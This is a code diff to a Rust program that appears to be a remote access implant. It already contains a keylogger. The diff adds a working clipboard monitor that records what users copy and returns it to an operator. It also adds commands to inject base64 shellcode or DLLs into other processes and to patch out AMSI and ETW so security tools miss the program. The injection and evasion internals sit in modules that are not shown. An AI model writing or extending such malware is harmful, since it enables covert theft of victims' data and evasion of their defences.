@@ -35,6 +35,101 @@ fn get_keylogger() -> &'static KeyLogger {
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
+pub struct ClipboardEntry {
+    pub timestamp: String,
+    pub content: String,
+}
+
+pub struct ClipboardMonitor {
+    running: Arc<RwLock<bool>>,
+    logs: Arc<RwLock<Vec<ClipboardEntry>>>,
+}
+
+impl ClipboardMonitor {
+    pub fn new() -> Self {
+        Self {
+            running: Arc::new(RwLock::new(false)),
+            logs: Arc::new(RwLock::new(Vec::new())),
+        }
+    }
+
+    pub async fn start(&self) {
+        let mut r = self.running.write().await;
+        if *r {
+            return;
+        }
+        *r = true;
+        drop(r);
+
+        let running = self.running.clone();
+        let logs = self.logs.clone();
+        tokio::spawn(async move {
+            let mut last_content = String::new();
+            loop {
+                {
+                    let r = running.read().await;
+                    if !*r { break; }
+                }
+                if let Some(text) = read_clipboard_text() {
+                    if text != last_content && !text.is_empty() {
+                        last_content = text.clone();
+                        let entry = ClipboardEntry {
+                            timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+                            content: text,
+                        };
+                        let mut l = logs.write().await;
+                        l.push(entry);
+                        if l.len() > 500 {
+                            l.remove(0);
+                        }
+                    }
+                }
+                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+            }
+        });
+    }
+
+    pub async fn stop(&self) {
+        let mut r = self.running.write().await;
+        *r = false;
+    }
+
+    pub async fn get_logs(&self) -> Vec<ClipboardEntry> {
+        self.logs.read().await.clone()
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn read_clipboard_text() -> Option<String> {
+    unsafe {
+        use winapi::um::winuser::{OpenClipboard, GetClipboardData, CloseClipboard, CF_TEXT};
+        use std::ffi::CStr;
+        if OpenClipboard(std::ptr::null_mut()) == 0 { return None; }
+        let handle = GetClipboardData(CF_TEXT);
+        let result = if handle.is_null() {
+            None
+        } else {
+            let ptr = handle as *const i8;
+            Some(CStr::from_ptr(ptr).to_string_lossy().into_owned())
+        };
+        CloseClipboard();
+        result
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn read_clipboard_text() -> Option<String> {
+    std::process::Command::new("xclip").args(["-selection", "clipboard", "-o"]).output().ok()
+        .and_then(|o| if o.status.success() { String::from_utf8(o.stdout).ok() } else { None })
+}
+
+static CLIPBOARD_MONITOR: OnceLock<ClipboardMonitor> = OnceLock::new();
+
+fn get_clipboard_monitor() -> &'static ClipboardMonitor {
+    CLIPBOARD_MONITOR.get_or_init(|| ClipboardMonitor::new())
+}
+
+#[derive(Debug, Serialize, Deserialize, Clone)]
 pub enum CommandType {
     #[serde(rename = "execute")]
     Execute { program: String, args: Vec<String> },
@@ -137,6 +232,18 @@ pub enum CommandType {
 
     #[serde(rename = "clipboard_logs")]
     ClipboardLogs,
+
+    #[serde(rename = "inject_shellcode")]
+    InjectShellcode { pid: u32, shellcode_b64: String },
+
+    #[serde(rename = "inject_dll")]
+    InjectDll { pid: u32, dll_path: String },
+
+    #[serde(rename = "amsi_bypass")]
+    AmsiBypass,
+
+    #[serde(rename = "etw_bypass")]
+    EtwBypass,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -199,6 +306,10 @@ impl Executor {
             CommandType::ClipboardStart => Self::clipboard_start().await,
             CommandType::ClipboardStop => Self::clipboard_stop().await,
             CommandType::ClipboardLogs => Self::clipboard_logs().await,
+            CommandType::InjectShellcode { pid, shellcode_b64 } => Self::inject_shellcode(*pid, shellcode_b64).await,
+            CommandType::InjectDll { pid, dll_path } => Self::inject_dll(*pid, dll_path).await,
+            CommandType::AmsiBypass => Self::amsi_bypass().await,
+            CommandType::EtwBypass => Self::etw_bypass().await,
         };
 
         result.execution_time_ms = start.elapsed().as_millis();
@@ -1049,16 +1160,20 @@ impl Executor {
     }
 
     async fn clipboard_start() -> CommandResult {
+        let monitor = get_clipboard_monitor();
+        monitor.start().await;
         CommandResult {
             command_type: "clipboard_start".to_string(),
             status: "success".to_string(),
-            output: "Clipboard monitoring started".to_string(),
+            output: "Clipboard monitoring started (polling every 2s)".to_string(),
             error: None,
             execution_time_ms: 0,
         }
     }
 
     async fn clipboard_stop() -> CommandResult {
+        let monitor = get_clipboard_monitor();
+        monitor.stop().await;
         CommandResult {
             command_type: "clipboard_stop".to_string(),
             status: "success".to_string(),
@@ -1069,12 +1184,50 @@ impl Executor {
     }
 
     async fn clipboard_logs() -> CommandResult {
+        let monitor = get_clipboard_monitor();
+        let logs = monitor.get_logs().await;
+        let output = serde_json::to_string_pretty(&logs).unwrap_or_else(|_| "[]".to_string());
         CommandResult {
             command_type: "clipboard_logs".to_string(),
             status: "success".to_string(),
-            output: "[]".to_string(),
+            output,
             error: None,
             execution_time_ms: 0,
+        }
+    }
+
+    async fn inject_shellcode(pid: u32, shellcode_b64: &str) -> CommandResult {
+        let start = Instant::now();
+        match base64::engine::general_purpose::STANDARD.decode(shellcode_b64) {
+            Ok(shellcode) => {
+                match crate::injection::ProcessInjector::inject_shellcode(pid, &shellcode) {
+                    Ok(msg) => CommandResult { command_type: "inject_shellcode".into(), status: "success".into(), output: msg, error: None, execution_time_ms: start.elapsed().as_millis() },
+                    Err(e) => CommandResult { command_type: "inject_shellcode".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: start.elapsed().as_millis() },
+                }
+            }
+            Err(e) => CommandResult { command_type: "inject_shellcode".into(), status: "error".into(), output: String::new(), error: Some(format!("Base64 decode failed: {}", e)), execution_time_ms: start.elapsed().as_millis() },
+        }
+    }
+
+    async fn inject_dll(pid: u32, dll_path: &str) -> CommandResult {
+        let start = Instant::now();
+        match crate::injection::ProcessInjector::inject_dll(pid, dll_path) {
+            Ok(msg) => CommandResult { command_type: "inject_dll".into(), status: "success".into(), output: msg, error: None, execution_time_ms: start.elapsed().as_millis() },
+            Err(e) => CommandResult { command_type: "inject_dll".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: start.elapsed().as_millis() },
+        }
+    }
+
+    async fn amsi_bypass() -> CommandResult {
+        match crate::evasion::AmsiBypass::patch() {
+            Ok(msg) => CommandResult { command_type: "amsi_bypass".into(), status: "success".into(), output: msg, error: None, execution_time_ms: 0 },
+            Err(e) => CommandResult { command_type: "amsi_bypass".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
+        }
+    }
+
+    async fn etw_bypass() -> CommandResult {
+        match crate::evasion::EtwBypass::patch() {
+            Ok(msg) => CommandResult { command_type: "etw_bypass".into(), status: "success".into(), output: msg, error: None, execution_time_ms: 0 },
+            Err(e) => CommandResult { command_type: "etw_bypass".into(), status: "error".into(), output: String::new(), error: Some(e), execution_time_ms: 0 },
         }
     }
 }
